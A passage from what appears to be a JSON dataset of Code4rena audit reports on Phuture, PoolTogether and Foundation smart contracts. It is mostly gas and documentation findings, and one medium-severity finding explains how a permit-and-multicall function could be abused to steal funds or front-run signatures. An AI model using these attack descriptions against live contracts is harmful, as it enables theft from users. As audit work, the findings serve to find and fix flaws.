to:\n```\n\trequire(lastAssetBalanceInBase != 0, \"Index: INSUFFICIENT_AMOUNT\");\n```\n\n========================================================================\n\n4. Using unchecked and prefix increment can save gas\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-04-phuture/blob/main/contracts/ManagedIndex.sol#L30\n\nRecommended Mitigation Steps:\nChange to:\n```\nfor (uint i; i < _assets.length;) {\n            address asset = _assets[i];\n            uint8 weight = _weights[i];\n\n            weightOf[asset] = weight;\n            assets.add(asset);\n\n            emit UpdateAnatomy(asset, weight);\n\tunchecked{\n\t\t++i; //@audit-info: Place here with unchecked\t\t\n        }\n    }\n```\n\n========================================================================\n\n5. Using `+=` to increase value on var\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-04-phuture/blob/main/contracts/ManagedIndexReweightingLogic.sol#L71\n\nRecommended Mitigation Steps:\nChange to:\n```\n\t_totalWeight += newWeight - prevWeight;\n```\n\n========================================================================\n\n6. Using if statement instead else if\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-04-phuture/blob/main/contracts/TrackedIndexReweightingLogic.sol#L74-L78\nhttps://github.com/code-423n4/2022-04-phuture/blob/main/contracts/ManagedIndexReweightingLogic.sol#L79-L83\nhttps://github.com/code-423n4/2022-04-phuture/blob/main/contracts/ManagedIndexReweightingLogic.sol#L96\n\nRecommended Mitigation Steps:\nUsing if statement can save gas\nChange to:\n```\n\t\tif (newShares > oldShares) {\n                    orderer.addOrderDetails(orderId, asset, newShares - oldShares, IOrderer.OrderSide.Buy);\n                } \n\t\tif (oldShares > newShares) { //@audit-info: Replacing else if with if statement here\n                    orderer.addOrderDetails(orderId, asset, oldShares - newShares, IOrderer.OrderSide.Sell);\n                }\n```\n\n========================================================================\n\n7. Use immutable variables can save gas\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-04-phuture/blob/main/contracts/PhuturePriceOracle.sol#L33\nhttps://github.com/code-423n4/2022-04-phuture/blob/main/contracts/PhuturePriceOracle.sol#L24\nhttps://github.com/code-423n4/2022-04-phuture/blob/main/contracts/PhuturePriceOracle.sol#L27\n\nRecommended Mitigation Steps:\nuse `immutable`\n\n========================================================================\n\n8. Gas improvement on calling SafeERC20.function\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-04-phuture/blob/main/contracts/vToken.sol#L219\n\nRecommended Mitigation Steps:\nby removing L#23 and directly call `SafeERC20.function`\n\nChange to:\n```\n\tSafeERC20.safeTransfer(asset, _recipient, Math.min(_amount, balance))\n```\n\n========================================================================\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-phuture-findings",
      "repo": "https://github.com/code-423n4/2022-04-phuture-findings",
      "url": "https://github.com/code-423n4/2022-04-phuture-findings/issues/75"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "GasFindings\n\n#1 create only 1 function to validate all address != address(0)\nhttps://github.com/pooltogether/v4-twab-delegator/blob/2b6d42506187dd7096043e2dfec65fa06ab18577/contracts/TWABDelegator.sol#L575\nIts unncessary to create multiple function to do the same thing (`_requireDelegateeNotZeroAddress`, `_requireDelegatorNotZeroAddress`, `_requireRecipientNotZeroAddress`). \nJust use one function to validate `address` != address(0) then pass all \nthe parameter which is intended to validate to the function\n\n#2 Unnecesary `SafeERC20` lib usage\nhttps://github.com/pooltogether/v4-twab-delegator/blob/2b6d42506187dd7096043e2dfec65fa06ab18577/contracts/TWABDelegator.sol\nThe only `SafeERC20.functions()` are used in this contract is `safeTransferFrom()` & `safeTransfer()`. Using `transfer` & `transferFrom` function from `ERC20` is the better way\nfor gas saving\n\n#3 Set function to `external`\nhttps://github.com/pooltogether/v4-twab-delegator/blob/2b6d42506187dd7096043e2dfec65fa06ab18577/contracts/Delegation.sol#L29\nThe `initialize()` visibility can set to `external`\n\n#4 Using ++i increment\nhttps://github.com/pooltogether/v4-twab-delegator/blob/2b6d42506187dd7096043e2dfec65fa06ab18577/contracts/Delegation.sol#L42\nusing ++i than i++ can save gas\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-pooltogether-findings",
      "repo": "https://github.com/code-423n4/2022-02-pooltogether-findings",
      "url": "https://github.com/code-423n4/2022-02-pooltogether-findings/issues/44"
    }
  },
  {
    "title": "QA Report",
    "body": "## Gas Optimizations\r\n\r\n### Unchecked math will save on gas\r\n```\r\n  function _computeLockUntil(uint96 _lockDuration) internal view returns (uint96) {\r\n    return uint96(block.timestamp) + _lockDuration; //@audit Gas Optimization Unchecked\r\n  }\r\n```\r\nThe `_computeLockUntil` function in `TWABDelegator.sol` can be optimized by adding the `unchecked` directive as this will never overflow the `uint96` type since it is limited by the `MAX_LOCK` constant (which is currently assigned to 180 days() by the call to `_requireLockDuration(_lockDuration);`.\r\n```\r\njustin@Stealth: 18362 » frf test.sol\r\ncompiling...\r\nCompiling 2 files with 0.8.12\r\nCompilation finished successfully\r\nsuccess.\r\nScript ran successfully.\r\nGas Used: 5401\r\n== Logs == \r\n180 days, 15552000\r\nCurrent timestamp, 1645633955\r\nCurrent timestamp + 5000 years, 159325633955\r\nMax uint96, 79228162514264337593543950335\r\n\r\n```\r\n\r\n### Unneeded Zero Address Check\r\nIn the `stake` function of the `TWABDelegator.sol` file, the `_requireRecipientNotZeroAddress` function is called on the `_to` parameter. However, this is unnecessary since the `_mint` function checks for the zero address when called. As such, it would be more gas efficient to not perform this call.\r\n```\r\n function stake(address _to, uint256 _amount) external {\r\n    _requireRecipientNotZeroAddress(_to);\r\n    //@audit Gas Optimization Above is unneeded since _mint checks whether _to is zero addr or not\r\n    _requireAmountGtZero(_amount);\r\n\r\n    IERC20(ticket).safeTransferFrom(msg.sender, address(this), _amount);\r\n    _mint(_to, _amount);\r\n```\r\n\r\n\r\n### More efficient order of operations in `updateDelegatee`\r\nIn the `updateDelegatee` function of the `TWABDelegator.sol` file the `_lockUntil` variable is defined by calling the `_computeLockUntil` function. However, if the `_lockDuration` is 0, then this value is the same as the current `block.timestamp`. As a result, the following code would be an optimization:\r\n\r\nOriginal Code:\r\n```\r\nuint96 _lockUntil = _computeLockUntil(_lockDuration); //@audit Gas Optimization\r\n\r\nif (_lockDuration > 0) {\r\n    _delegation.setLockUntil(_lockUntil);\r\n}\r\n\r\n_delegateCall(_delegation, _delegatee);\r\n\r\nemit DelegateeUpdated(_delegator, _slot, _delegatee, _lockUntil, msg.sender);\r\n```\r\n\r\nOptimized Code:\r\n```\r\nuint96 _lockUntil = block.timestamp;\r\nif (_lockDuration > 0) {\r\n    _lockUntil = _computeLockUntil(_lockDuration);\r\n    _delegation.setLockUntil(_lockUntil);\r\n}\r\n_delegateCall(_delegation, _delegatee);\r\nemit DelegateeUpdated(_delegator, _slot, _delegatee, _lockUntil, msg.sender);\r\n```\r\n\r\nHere are the tests with the optimizations (* indicates Optimized case):\r\n```\r\n·························|·····························|·············|·············|··············|···············|··············\r\n|  Contract              ·  Method                     ·  Min        ·  Max        ·  Avg         ·  # calls      ·  usd (avg)  │\r\n·························|·····························|·············|·············|··············|···············|··············\r\n|  TWABDelegatorHarness  ·  updateDelegatee            ·     140113  ·     144124  ·      141911  ·            7  ·          -  │\r\n·························|·····························|·············|·············|··············|···············|··············\r\n|  *TWABDelegatorHarness ·  updateDelegatee            ·     139965  ·     144126  ·      141806  ·            7  ·          -  │\r\n·························|·····························|·············|·············|··············|···············|··············\r\n```\r\n\r\n\r\n## Non-Critcal \r\n\r\n### Missing comment for the `to` parameter\r\nThere is no comment on the `to` parameter for the `TransferredDelegation` event in the `TWABDelegator.sol` file.\r\n```\r\n  /**\r\n   * @notice Emitted when a delegator withdraws an amount of tickets from a delegation to their wallet.\r\n   * @param delegator Address of the delegator\r\n   * @param slot  Slot of the delegation\r\n   * @param amount Amount of tickets withdrawn\r\n   */\r\n   //@audit Missing comment for the `to` parameter\r\n  event TransferredDelegation(\r\n    address indexed delegator,\r\n    uint256 indexed slot,\r\n    uint256 amount,\r\n    address indexed to\r\n  );\r\n  ```\r\n\r\n\r\n  ## Low\r\n\r\n  ### Incorrect Event Parameters\r\n  The `TWABDelegator.sol`'s `TicketsStaked` event's first parameter should be the delegator, as such, it should be `msg.sender` not `_to` as `_to` is the recipient.\r\n  ```\r\n    /**\r\n   * @notice Emitted when tickets have been staked.\r\n   * @param delegator Address of the delegator\r\n   * @param amount Amount of tickets staked\r\n   */\r\n  event TicketsStaked(address indexed delegator, uint256 amount);\r\n\r\n  ...\r\n\r\n    /**\r\n   * @notice Stake `_amount` of tickets in this contract.\r\n   * @dev Tickets can be staked on behalf of a `_to` user.\r\n   * @param _to Address to which the stake will be attributed\r\n   * @param _amount Amount of tickets to stake\r\n   */\r\n  function stake(address _to, uint256 _amount) external {\r\n    _requireRecipientNotZeroAddress(_to); //@audit See here that the _to is the recipient, not the delegator.\r\n    _requireAmountGtZero(_amount);\r\n\r\n    IERC20(ticket).safeTransferFrom(msg.sender, address(this), _amount);\r\n    _mint(_to, _amount);\r\n\r\n    emit TicketsStaked(_to, _amount);//@audit the first parameter of TicketsStacked should be delegator, not recipient. Should be msg.sender.\r\n  }\r\n  ```\r\n\r\n### Incorrect Comment Associated with `transferDelegationTo`\r\nThe comments above the `transferDelegationTo` function are incorrect. The first line, which begins with `@notice`, says `The tickets are transferred to the caller`. However, the tickets are transfered to the `_to` parameter as can be seen by the line `_transfer(_delegation, _to, _amount);`\r\nIn addition, the comment directly below that states `Will directly send the tickets to the delegator wallet.` This is also incorrect per the above reason.\r\n```\r\n  /**\r\n   * @notice Withdraw an `_amount` of tickets from a delegation. The delegator is assumed to be the caller. The tickets are transferred to the caller.\r\n   * @dev Will directly send the tickets to the delegator wallet.\r\n   * @dev Will revert if delegation is still locked.\r\n   * @param _slot Slot of the delegation\r\n   * @param _amount Amount to withdraw\r\n   * @param _to Account to transfer the withdrawn tickets to\r\n   * @return The address of the Delegation\r\n   */\r\n  function transferDelegationTo(\r\n    uint256 _slot,\r\n    uint256 _amount,\r\n    address _to\r\n  ) external returns (Delegation) {\r\n    _requireRecipientNotZeroAddress(_to);\r\n\r\n    Delegation _delegation = Delegation(_computeAddress(msg.sender, _slot));\r\n    _transfer(_delegation, _to, _amount);\r\n\r\n    emit TransferredDelegation(msg.sender, _slot, _amount, _to);\r\n\r\n    return _delegation;\r\n  }\r\n  ```\r\n  ",
    "dataSource": {
      "name": "code-423n4/2022-02-pooltogether-findings",
      "repo": "https://github.com/code-423n4/2022-02-pooltogether-findings",
      "url": "https://github.com/code-423n4/2022-02-pooltogether-findings/issues/40"
    }
  },
  {
    "title": "QA Report",
    "body": "# QA Report\n\n**Table of Contents:**\n\n- [QA Report](#qa-report)\n  - [Foreword](#foreword)\n  - [Summary](#summary)\n  - [File: PermitAndMulticall.sol](#file-permitandmulticallsol)\n    - [function _permitAndMulticall()](#function-_permitandmulticall)\n      - [Missing `@param _permitToken`](#missing-param-_permittoken)\n  - [File: TWABDelegator.sol](#file-twabdelegatorsol)\n    - [event TransferredDelegation()](#event-transferreddelegation)\n      - [Missing `@param to`](#missing-param-to)\n    - [function _executeCall()](#function-_executecall)\n      - [Missing `@return bytes[]`](#missing-return-bytes)\n\n## Foreword\n\n- **`@audit` tags**\n\n> The code is annotated at multiple places with `//@audit` comments to pinpoint the issues. Please, pay attention to them for more details.\n\n## Summary\n\n- Only some missing `@param` and `@return` comments were found as low-risk issues according to C4's scale. \n- While `Delegator.sol:initialize()` was found to be front-runnable (but not callable multiple times), the issue was severe enough (due to CREATE2) to be sent separately as a medium-risk issue instead of a low-risk one.\n\n## File: PermitAndMulticall.sol\n\n### function _permitAndMulticall()\n\n#### Missing `@param _permitToken`\n\n```\n39:   /**\n40:    * @notice Alow a user to approve ticket and run various calls in one transaction.\n41:    * @param _from Address of the sender //@audit missing @param _permitToken\n42:    * @param _amount Amount of tickets to approve\n43:    * @param _permitSignature Permit signature\n44:    * @param _data Datas to call with `functionDelegateCall`\n45:    */\n46:   function _permitAndMulticall(\n47:     IERC20Permit _permitToken,\n48:     address _from,\n49:     uint256 _amount,\n50:     Signature calldata _permitSignature,\n51:     bytes[] calldata _data\n52:   ) internal {\n```\n\n## File: TWABDelegator.sol\n\n### event TransferredDelegation()\n\n#### Missing `@param to`\n\n```\n125:   /**\n126:    * @notice Emitted when a delegator withdraws an amount of tickets from a delegation to their wallet.\n127:    * @param delegator Address of the delegator\n128:    * @param slot  Slot of the delegation\n129:    * @param amount Amount of tickets withdrawn //@audit missing @param to\n130:    */\n131:   event TransferredDelegation(\n132:     address indexed delegator,\n133:     uint256 indexed slot,\n134:     uint256 amount,\n135:     address indexed to\n136:   );\n```\n\n### function _executeCall()\n\n#### Missing `@return bytes[]`\n\n```\nFile: TWABDelegator.sol\n543:   /**\n544:    * @notice Execute a function call on the delegation contract.\n545:    * @param _delegation Address of the delegation contract\n546:    * @param _data The call data that will be executed //@audit missing @return bytes[]\n547:    */\n548:   function _executeCall(Delegation _delegation, bytes memory _data)\n549:     internal\n550:     returns (bytes[] memory)\n```\n",
    "dataSource": {
      "name": "code-423n4/2022-02-pooltogether-findings",
      "repo": "https://github.com/code-423n4/2022-02-pooltogether-findings",
      "url": "https://github.com/code-423n4/2022-02-pooltogether-findings/issues/35"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "## [G-00] Reduce Runtime Gas With Modifiers\n\n**Severity**: _Gas_\n**Likelihood**: _High_\n**Status**: {Submitted}\n**Scope**: [`TWABDelegator.sol`](https://github.com/pooltogether/v4-twab-delegator/blob/2b6d42506187dd7096043e2dfec65fa06ab18577/contracts/TWABDelegator.sol)\n\nMultiple `internal` functions in `TWABDelegator` can be turned into modifiers to reduce runtime gas costs at the expense of increasing the deployment cost.\n\nBelow, we show the gas costs of internal functions (first image) and using modifiers instead (second image).\n\n![Gas costs when using internal function calls](https://i.imgur.com/nDbGkhS.png)\n_Gas costs when using internal function calls_\n\n![Gas Costs when using Modifiers](https://i.imgur.com/07q5nys.png)\n_Gas costs when using modifiers_\n\nFunctions changed to modifiers to achieve the above results:\n\n- [`_requireDelegatorOrRepresentative(address _delegator)`](https://github.com/pooltogether/v4-twab-delegator/blob/2b6d42506187dd7096043e2dfec65fa06ab18577/contracts/TWABDelegator.sol#L577-L586)\n- [`_requireDelegateeNotZeroAddress(address _delegatee)`](https://github.com/pooltogether/v4-twab-delegator/blob/2b6d42506187dd7096043e2dfec65fa06ab18577/contracts/TWABDelegator.sol#L588-L594)\n- [`_requireAmountGtZero(uint256 _amount)`](https://github.com/pooltogether/v4-twab-delegator/blob/2b6d42506187dd7096043e2dfec65fa06ab18577/contracts/TWABDelegator.sol#L596-L602)\n- [`_requireDelegatorNotZeroAddress(address _delegator)`](https://github.com/pooltogether/v4-twab-delegator/blob/2b6d42506187dd7096043e2dfec65fa06ab18577/contracts/TWABDelegator.sol#L604-L610)\n- [`_requireRecipientNotZeroAddress(address _to)`](https://github.com/pooltogether/v4-twab-delegator/blob/2b6d42506187dd7096043e2dfec65fa06ab18577/contracts/TWABDelegator.sol#L612-L618)\n- [`_requireLockDuration(uint256 _lockDuration)`](https://github.com/pooltogether/v4-twab-delegator/blob/2b6d42506187dd7096043e2dfec65fa06ab18577/contracts/TWABDelegator.sol#L636-L642)\n\n\n**Recommendation**: Change the specified internal functions into modifiers to reduce runtime gas costs at the expense of bytecode bloat (increased deployment costs). This also requires changing their usage into modifier syntax rather than _call_.\n\n\n## [G-01] Solmate Port\n\n**Severity**: _Gas_\n**Likelihood**: _High_\n**Status**: {Submitted}\n**Scope**: [`contracts/*`](https://github.com/pooltogether/v4-twab-delegator/tree/2b6d42506187dd7096043e2dfec65fa06ab18577/contracts)\n\n**Recommendation**: Port contracts over to using [solmate](https://github.com/Rari-Capital/solmate) to significantly reduce openzeppelin bloat (will require a custom write of ERC20Permit and its interface as well as deterministic cloning (ref: https://github.com/Rari-Capital/vaults)).\n\n\n## [I-00] Inconsistent Licensing\n\n**Severity**: _Informational_\n**Likelihood**: _High_\n**Status**: {Submitted}\n**Scope**: [`contracts/*`](https://github.com/pooltogether/v4-twab-delegator/tree/2b6d42506187dd7096043e2dfec65fa06ab18577/contracts)\n\n`Delegation.sol` has SPDX Identifier: `// SPDX-License-Identifier: MIT`\n`LowLevelDelegator.sol` has SPDX Identifier: `// SPDX-License-Identifier: GPL-3.0`\n`PermitAndMulticall.sol` has SPDX Identifier: `// SPDX-License-Identifier: MIT`\n`TWABDelegator.sol` has SPDX Identifier: `// SPDX-License-Identifier: GPL-3.0`\n\n`test/TWABDelegatorHarness.sol` has SPDX Identifier: `// SPDX-License-Identifier: GPL-3.0`\n\n**Recommendation**: Coalesce SPDX License Identifiers into one canonical license unless necessary.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-pooltogether-findings",
      "repo": "https://github.com/code-423n4/2022-02-pooltogether-findings",
      "url": "https://github.com/code-423n4/2022-02-pooltogether-findings/issues/33"
    }
  },
  {
    "title": "`permitAndMulticall()` May Be Used to Steal Funds Or as a Denial Of Service if `_from` Is Not The Message Sender",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/pooltogether/v4-twab-delegator/blob/2b6d42506187dd7096043e2dfec65fa06ab18577/contracts/PermitAndMulticall.sol#L46-L64\nhttps://github.com/pooltogether/v4-twab-delegator/blob/2b6d42506187dd7096043e2dfec65fa06ab18577/contracts/PermitAndMulticall.sol#L31-L37\nhttps://github.com/pooltogether/v4-twab-delegator/blob/2b6d42506187dd7096043e2dfec65fa06ab18577/contracts/TWABDelegator.sol#L438-L445\n\n\n# Vulnerability details\n\n## Impact\n\nWhen the `_from` address is not the `msg.sender` `_multiCall()` will be made on behalf of the `msg.sender`. As a result each of the functions called by `multiCall()` will be made on behalf of `msg.sender` and not `_from`.\n\nIf functions such as `transfer()` or `unstake()` are called `msg.sender` will be the original caller which would transfer the attacker the funds if the `to` field is set to an attackers address.\n\nFurthermore, if an attacker we to call `permitAndMulticall()` before the `_from` user they may use their signature and nonce combination. As a nonce is only allowe to be used once the siganture will no longer be valid and `_permitToken.permit()` will fail on the second call.\n\nAn attacker may use this as a Denial of Service (DoS) attack by continually front-running `permitAndCall()` using other users signatures.\n\n## Proof of Concept\n\n```\n  function _multicall(bytes[] calldata _data) internal virtual returns (bytes[] memory results) {\n    results = new bytes[](_data.length);\n    for (uint256 i = 0; i < _data.length; i++) {\n      results[i] = Address.functionDelegateCall(address(this), _data[i]);\n    }\n    return results;\n  }\n```\n\n```\n  function _permitAndMulticall(\n    IERC20Permit _permitToken,\n    address _from,\n    uint256 _amount,\n    Signature calldata _permitSignature,\n    bytes[] calldata _data\n  ) internal {\n    _permitToken.permit(\n      _from,\n      address(this),\n      _amount,\n      _permitSignature.deadline,\n      _permitSignature.v,\n      _permitSignature.r,\n      _permitSignature.s\n    );\n\n    _multicall(_data);\n  }\n```\n\n## Recommended Mitigation Steps\n\nConsider updating the `_from` field to be the `msg.sender` in `permitAndMulticall()` (or alternatively do this in `_permitAndMulticall()` to save some gas).\n\n```\n  function permitAndMulticall(\n    uint256 _amount,\n    Signature calldata _permitSignature,\n    bytes[] calldata _data\n  ) external {\n    _permitAndMulticall(IERC20Permit(address(ticket)), msg.sender, _amount, _permitSignature, _data);\n  }\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-pooltogether-findings",
      "repo": "https://github.com/code-423n4/2022-02-pooltogether-findings",
      "url": "https://github.com/code-423n4/2022-02-pooltogether-findings/issues/20"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "Title: Internal functions to private\nSeverity: GAS\n\nThe following functions could be set private to save gas and improve code quality:\n\n        TWABDelegator.sol, _computeLockUntil\n        TWABDelegator.sol, _requireDelegateeNotZeroAddress\n        TWABDelegator.sol, _executeCall\n        TWABDelegator.sol, _transfer\n        TWABDelegator.sol, _requireContract\n        TWABDelegator.sol, _computeAddress\n        TWABDelegator.sol, _requireAmountGtZero\n        TWABDelegator.sol, _requireDelegatorNotZeroAddress\n        LowLevelDelegator.sol, _computeAddress\n        TWABDelegator.sol, _transferCall\n        TWABDelegator.sol, _requireRecipientNotZeroAddress\n        PermitAndMulticall.sol, _permitAndMulticall\n        TWABDelegator.sol, _requireDelegationUnlocked\n        TWABDelegator.sol, _requireLockDuration\n        TWABDelegator.sol, _requireDelegatorOrRepresentative\n        LowLevelDelegator.sol, _createDelegation\n        PermitAndMulticall.sol, _multicall\n        TWABDelegator.sol, _delegateCall\n        LowLevelDelegator.sol, _computeSalt\n        Delegation.sol, _executeCall\n\n\n\nTitle: Unnecessary equals boolean\nSeverity: GAS\n\n\nBoolean variables can be checked within conditionals directly without the use of equality operators to true/false.\n\n        TWABDelegator.sol, 583: _delegator == msg.sender || representatives[_delegator][msg.sender] == true,\n\n\n\nTitle: State variables that could be set immutable\nSeverity: GAS\n\nIn the following files there are state variables that could be set immutable to save gas. \n\n        delegationInstance in LowLevelDelegator.sol\n\n\n\nTitle: Unnecessary array boundaries check when loading an array element twice\nSeverity: GAS\n\n\n    There are places in the code (especially in for-each loops) that loads the same array element more than once. \n    In such cases, only one array boundaries check should take place, and the rest are unnecessary.\n    Therefore, this array element should be cached in a local variable and then be loaded\n    again using this local variable, skipping the redundant second array boundaries check: \n    \n        Delegation.sol.executeCalls - double load of calls[i]\n\n\n\nTitle: Unnecessary functions\nSeverity: GAS\n\n\n    The following functions are not used at all. Therefore you can remove them to save deployment gas and improve code clearness.\n    \n    \n        LowLevelDelegator.sol, _createDelegation\n        LowLevelDelegator.sol, _computeSalt\n        PermitAndMulticall.sol, _permitAndMulticall\n        LowLevelDelegator.sol, _computeAddress\n\n\n\nTitle: Caching array length can save gas\nSeverity: GAS\n\n\nCaching the array length is more gas efficient.\nThis is because access to a local variable in solidity is more efficient than query storage / calldata / memory.\nWe recommend to change from:    \n\n    for (uint256 i=0; i<array.length; i++) { ... }\n\nto: \n\n    uint len = array.length  \n    for (uint256 i=0; i<len; i++) { ... }\n\n\n        Delegation.sol, calls, 42\n        PermitAndMulticall.sol, _data, 33\n\n\n\nTitle: Unused imports\nSeverity: GAS\n\n\nIn the following files there are contract imports that aren't used\nImport of unnecessary files costs deployment gas (and is a bad coding practice that is important to ignore)\n\n        PermitAndMulticall.sol, line 4, import \"@openzeppelin/contracts/token/ERC20/extensions/draft-IERC20Permit.sol\";\n\n\n\nTitle: Prefix increments are cheaper than postfix increments\nSeverity: GAS\n\nPrefix increments are cheaper than postfix increments. \nFurther more, using unchecked {++x} is even more gas efficient, and the gas saving accumulates every iteration and can make a real change\nThere is no risk of overflow caused by increamenting the iteration index in for loops (the `++i` in `for (uint256 i = 0; i < numIterations; ++i)`).\nBut increments perform overflow checks that are not necessary in this case.\nThese functions use not using prefix increments (`++x`) or not using the unchecked keyword: \n\n        change to prefix increment and unchecked: Delegation.sol, i, 42\n        change to prefix increment and unchecked: PermitAndMulticall.sol, i, 33\n\n\n\nTitle: Consider inline the following functions to save gas\nSeverity: GAS\n\n\n    You can inline the following functions instead of writing a specific function to save gas.\n    (see https://github.com/code-423n4/2021-11-nested-findings/issues/167 for a similar issue.)\n\n    \n        TWABDelegator.sol, _computeLockUntil, { return uint96(block.timestamp) + _lockDuration; }\n        LowLevelDelegator.sol, _computeSalt, { return keccak256(abi.encodePacked(_delegator, _slot)); }\n        TWABDelegator.sol, _computeAddress, { return _computeAddress(_computeSalt(_delegator, bytes32(_slot))); }\n        LowLevelDelegator.sol, _computeAddress, { return address(delegationInstance).predictDeterministicAddress(_salt, address(this)); }\n\n\n\nTitle: Public functions to external\nSeverity: GAS\n\nThe following functions could be set external to save gas and improve code quality. \nExternal call cost is less expensive than of public functions. \n\n        Delegation.sol, initialize\n\n\n\nTitle: Use calldata instead of memory\nSeverity: GAS\n\n\nUse calldata instead of memory for function parameters\nIn some cases, having function arguments in calldata instead of\nmemory is more optimal.\n    \n\n        TWABDelegator.constructor (name_)\n        TWABDelegator.constructor (symbol_)\n        Delegation._executeCall (data)\n        TWABDelegator._executeCall (_data)\n\n\n\nTitle: Inline one time use functions\nSeverity: GAS\n\n\nThe following functions are used exactly once. Therefore you can inline them and save gas and improve code clearness.\n    \n\n        TWABDelegator.sol, _transferCall\n        PermitAndMulticall.sol, _multicall\n        TWABDelegator.sol, _requireDelegatorNotZeroAddress\n        Delegation.sol, _executeCall\n\n\n\nTitle: Unnecessary index init\nSeverity: GAS\n\n\nIn for loops you initialize the index to start from 0, but it already initialized to 0 in default and this assignment cost gas. \nIt is more clear and gas efficient to declare without assigning 0 and will have the same meaning:\n\n        PermitAndMulticall.sol, 33\n        Delegation.sol, 42\n\n\n\nTitle: Use unchecked to save gas for certain additive calculations that cannot overflow\nSeverity: GAS\n\n\nYou can use unchecked in the following calculations since there is no risk to overflow:\n\n        TWABDelegator.sol (L#511) - return uint96(block.timestamp) + _lockDuration;\n\n\n\nTitle: Short the following require messages\nSeverity: GAS\n\nThe following require messages are of length more than 32 and we think are short enough to short\nthem into exactly 32 characters such that it will be placed in one slot of memory and the require \nfunction will cost less gas. \nThe list: \n\n        Solidity file: TWABDelegator.sol, In line 582, Require message length to shorten: 34, The message: TWABDelegator/not-delegator-or-rep\n\n\n\nTitle: Use != 0 instead of > 0\nSeverity: GAS\n\n\nUsing != 0 is slightly cheaper than > 0. (see https://github.com/code-423n4/2021-12-maple-findings/issues/75 for similar issue)\n\n\n        TWABDelegator.sol, 273: change '_lockDuration > 0' to '_lockDuration != 0'\n        TWABDelegator.sol, 601: change '_amount > 0' to '_amount != 0'\n",
    "dataSource": {
      "name": "code-423n4/2022-02-pooltogether-findings",
      "repo": "https://github.com/code-423n4/2022-02-pooltogether-findings",
      "url": "https://github.com/code-423n4/2022-02-pooltogether-findings/issues/15"
    }
  },
  {
    "title": "QA Report",
    "body": "2022-02-foundation\n\n1 Use safeTransferFrom instead of transferFrom.\n\nOpenzeppelin says that Usage of this method is discouraged, use safeTransferFrom whenever possible. In these cases,  you can use safeTransferFrom.\n\nhttps://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketOffer.sol#L264\nhttps://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketPrivateSale.sol#L177\nhttps://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketCore.sol#L86\nhttps://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketCore.sol#L97\nhttps://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketCore.sol#L105\n\n2 wrong description? (I am not sure.) ERC20 funds?\n\nhttps://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/CollateralManagement.sol#L25-L26\n\n3 delete unnecessary code. I think the following code is not necessary, because this function is internal and called only by _buy. In _buy the related nftContractToTokenIdToBuyPrice will be deleted.\n\nhttps://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketBuyPrice.sol#L282-L292\n\n4 delete unused variable name for return value. \n\nFor example, the variable name market is not used, so you can delete it.\n\nhttps://github.com/code-423n4/2022-02-foundation/blob/main/contracts/FETH.sol#L693 delete market\nhttps://github.com/code-423n4/2022-02-foundation/blob/main/contracts/FETH.sol#L661 delete amount\n\nhttps://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketCore.sol#L112  delete fetchAddress\n\nhttps://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketOffer.sol#L358 delete amount\n\n5 missing inputs validation. \nLength of nftContracts and tokenIds must be same\n\nhttps://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketOffer.sol#L150-L158\n\nif (nftContracts.length != tokenIds.length) revert SomethingError();\n\n6 address is not necessary.\n\nType of param nftContract is address, so you don’t need to convert it with address(). \n\nhttps://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/NFTMarketBuyPrice.sol#L253\n\n\n7 emit msg.sender and msg.value if contract receives ether.\n\nhttps://github.com/code-423n4/2022-02-foundation/blob/main/contracts/mixins/CollateralManagement.sol#L21\n\nFor example,\nreceive() external payable {\n    emit EtherReceived(msg.sender, msg.value);\n}\n",
    "dataSource": {
      "name": "code-423n4/2022-02-foundation-findings",
      "repo": "https://github.com/code-423n4/2022-02-foundation-findings",
      "url": "https://github.com/code-423n4/2022-02-foundation-findings/issues/84"
    }
  },
  {
    "title": "QA Report",
    "body": " # C4-001 : Use of ecrecover is susceptible to signature malleability\n\n## Impact - LOW\n\nThe ecrecover function is used in permit() to recover the address from the signature. The built-in EVM precompile ecrecover is susceptible to signature malleability which could lead to replay attacks (references: https://swcregistry.io/docs/SWC-117, https://swcregistry.io/docs/SWC-121 and https://medium.com/cryptronics/signature-replay-vulnerabilities-in-smart-contracts-3b6f7596df57).\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2022-02-foundation/blob/a03a7e198c1dfffb1021c0e8ec91ba4194b8aa12/contracts/mixins/NFTMarketPrivateSale.sol#L171\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nConsider using OpenZeppelin’s ECDSA library (which prevents this malleability) instead of the built-in function.\n\n\n# C4-002 : Missing Conditional Check In the Allowance\n\n## Impact - LOW\n\nDuring the code review, It has been observed that If the allowance is given maximum uint. The check should be nice to have check if the current allowance is maximum.\n\n## Proof of Concept\n\n1. Navigate to \"https://github.com/code-423n4/2022-02-foundation/blob/a03a7e198c1dfffb1021c0e8ec91ba4194b8aa12/contracts/FETH.sol#L212\"\n2. The max allowance check has not been checked on the function.\n\nEnsure that is the required checks are compatible with Openzeppelin ERC20.\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L336\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nImplement the following check in the related function.\n\n```\nif (allowed[from][msg.sender != type(uint256).max)\n```\n\n## 